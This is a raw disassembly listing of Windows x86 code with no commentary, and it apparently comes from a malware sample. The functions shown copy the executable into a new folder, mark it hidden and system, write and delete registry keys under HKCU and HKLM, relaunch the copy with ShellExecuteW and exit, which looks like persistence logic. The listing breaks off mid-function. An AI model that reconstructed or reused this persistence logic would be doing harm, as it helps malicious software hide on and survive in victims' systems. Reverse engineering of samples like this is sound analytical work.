call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push r--data
push r--data
push 0x80000002
call sub_40a690
add esp 0x20
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp + 0xb ]
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push esi
push edi
push esi
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push r--data
push r--data
push 0x80000002
call sub_40a690
add esp 0x20
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push 0x1
lea eax [ ebp - 0x30 ]
sub esp 0x10
mov ebx esp
push esi
push edi
push esi
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push [ ebp + 0x1c ]
push r--data
push 0x80000002
call sub_40a690
add esp 0x20
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_406ea9
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
push edi
push [ ebp + 0xc ]
call [ wcslen@IAT ]
test eax eax
pop ecx
mov ebx r--data
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x8 ]
push eax
call sub_407cfa
add esp 0xc
mov esi rw-data
mov ecx esi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
push 0x0
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ CreateDirectoryW@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push ebx
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov esi rw-data
mov ecx esi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x10 ]
jmp r-xdata
push 0x0
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push edi
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
call sub_406cd5
add esp 0x18
mov al 0x1
jmp r-xdata
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
mov edi rw-data
push eax
push edi
call [ wcscmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
call sub_406cd5
add esp 0x18
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] 0x36
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp + 0x17 ]
push r--data
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp + 0x17 ]
lea ecx [ ebp - 0x10 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
cmp [ ebp + 0x18 ] 0x1
mov ebx r--data
jne r-xdata
push 0x7
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
mov esi [ SetFileAttributesW@IAT ]
push eax
call esi
push [ ebp + 0xc ]
call [ wcslen@IAT ]
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ wcslen@IAT ]
pop ecx
push [ ebp + 0x10 ]
test eax eax
je r-xdata
lea eax [ ebp + 0x17 ]
push ebx
push eax
push r--data
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x1b ]
push rw-data
push eax
push r--data
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x70 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x80 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x10 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
xor esi esi
lea ecx [ ebp - 0x20 ]
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
shl eax 0x1
push eax
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
test al al
je r-xdata
mov esi r--data
push ebx
lea eax [ ebp + 0x17 ]
push esi
push eax
push edi
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x1b ]
push esi
push eax
push r--data
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x50 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x10 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x7
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call esi
lea eax [ ebp - 0x50 ]
push 0x36
push eax
call sub_407cfa
add esp 0xc
mov ecx esi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x50 ]
push ebx
lea eax [ ebp - 0x50 ]
push [ ebp + 0xc ]
push 0x36
push eax
call sub_407cfa
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx esi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x50 ]
jmp r-xdata
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax r--data
push esi
push eax
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push esi
call [ ShellExecuteW@IAT ]
cmp eax 0x20
jle r-xdata
push edi
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
xor al al
jmp r-xdata
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x0
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push edi
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
push esi
call [ exit@IAT ]
sub_4072cf
push ebp
mov ebp esp
sub esp 0x25c
push ebx
push esi
push edi
call sub_409cc8
cmp [ rw-data ] 0x30
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx rw-data
call sub_405c3c
cmp [ rw-data ] 0x0
je r-xdata
call sub_40f88c
cmp [ rw-data ] 0x1
mov edi r--data
mov ebx 0x80000001
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_411379
pop ecx
cmp [ rw-data ] 0x1
mov esi 0x80000002
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push edi
push ebx
call sub_40a878
add esp 0xc
cmp [ rw-data ] 0x1
mov edi r--data
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push edi
push esi
call sub_40a878
add esp 0xc
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_40a624
add esp 0x20
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_40a624
add esp 0x20
and [ ebp - 0x25c ] 0x0
mov ecx 0x81
xor eax eax
lea edi [ ebp - 0x25a ]
[ edi ]
mov esi rw-data
mov ecx esi
stosw [ edi ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov edi 0x208
lea eax [ ebp - 0x25c ]
push edi
mov esi rw-data
push eax
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
call sub_40a5ae
add esp 0x1c
test al al
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push esi
call sub_40a878
add esp 0xc
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
call [ RegDeleteKeyA@IAT ]
lea eax [ ebp - 0x25c ]
push edi
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x25c ]
push 0x80
push eax
call [ SetFileAttributesW@IAT ]
test eax eax
jne r-xdata
push 0x80
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ SetFileAttributesW@IAT ]
mov ebx [ std::operator!=@IAT ]
mov esi r--data
mov edi rw-data
push esi
push edi
mov [ ebp - 0x1 ] 0x1
call ebx
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x2 ]
push r--data
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x24 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
and [ ebp - 0x1 ] al
lea eax [ ebp - 0x25c ]
push r--data
push eax
lea eax [ ebp - 0x2 ]
push eax
push r--data
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea eax [ ebp - 0x2 ]
push r--data
push eax
lea eax [ ebp - 0x25c ]
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push esi
push edi
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
push r--data
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
xor edi edi
lea ecx [ ebp - 0x54 ]
push edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
shl eax 0x1
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
test al al
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x44 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push edi
call [ exit@IAT ]
push edi
push esi
push esi
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push edi
call [ ShellExecuteW@IAT ]
sub_407697
push ebp
mov ebp esp
sub esp 0x27c
push ebx
push esi
push edi
call sub_409cc8
cmp [ rw-data ] 0x30
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx rw-data
call sub_405c3c
cmp [ rw-data ] 0x0
je r-xdata
call sub_40f88c
cmp [ rw-data ] 0x1
mov ebx rw-data
mov edi r--data
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_411379
pop ecx
cmp [ rw-data ] 0x1
mov esi 0x80000002
jne r-xdata
mov ecx ebx
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push edi
push 0x80000001
call sub_40a878
add esp 0xc
cmp [ rw-data ] 0x1
mov edi r--data
jne r-xdata
mov ecx ebx
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push edi
push esi
call sub_40a878
add esp 0xc
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_40a624
add esp 0x20
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_40a624
